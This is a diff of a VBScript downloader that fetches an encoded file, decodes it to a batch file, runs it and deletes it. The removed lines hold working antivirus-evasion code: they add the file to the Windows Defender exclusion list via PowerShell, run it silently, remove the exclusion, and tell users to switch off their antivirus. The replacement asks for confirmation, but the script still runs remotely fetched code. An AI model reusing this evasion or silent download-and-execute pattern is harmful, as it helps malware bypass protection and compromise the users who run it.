@@ -33,7 +33,7 @@ objXMLHTTP.Open "GET", encodedFileUrl, False
 objXMLHTTP.Send
 
 If Err.Number <> 0 Then
-    MsgBox "Error: Failed to create XMLHTTP object or send request. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
+    MsgBox "Error: Failed to create XMLHTTP object or send request. Please check your network connection.", vbCritical, "Error"
     WScript.Quit
 End If
 
@@ -54,24 +54,19 @@ If objXMLHTTP.Status = 200 Then
     objFile.Write decodedContent
     objFile.Close
 
-    ' Add the decoded batch file to antivirus exclusion list
-    On Error Resume Next
-    objShell.Run "powershell -Command Add-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
-    If Err.Number <> 0 Then
-        MsgBox "Error: Unable to add exclusion. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
-        Err.Clear
+    ' Execute the batch file with user confirmation
+    userResponse = MsgBox("The script has downloaded and decoded the necessary file. Do you want to execute it?", vbYesNo + vbQuestion, "Execute Decoded File")
+    If userResponse = vbYes Then
+        objShell.Run Chr(34) & decodedFilePath & Chr(34), 1, True
+    Else
+        MsgBox "Execution canceled by the user.", vbInformation, "Canceled"
     End If
-    On Error GoTo 0
-
-    ' Execute the batch file silently
-    objShell.Run Chr(34) & decodedFilePath & Chr(34), 0, True
-
-    ' Remove the exclusion after execution
-    objShell.Run "powershell -Command Remove-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
 
     ' Clean up by deleting the temporary decoded batch file
-    objFSO.DeleteFile(decodedFilePath)
+    If objFSO.FileExists(decodedFilePath) Then
+        objFSO.DeleteFile(decodedFilePath)
+    End If
 Else
     ' Handle failure in downloading the file
-    MsgBox "Error: Failed to download the encoded file. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
+    MsgBox "Error: Failed to download the encoded file. Please check the URL or your network connection.", vbCritical, "Error"
 End If
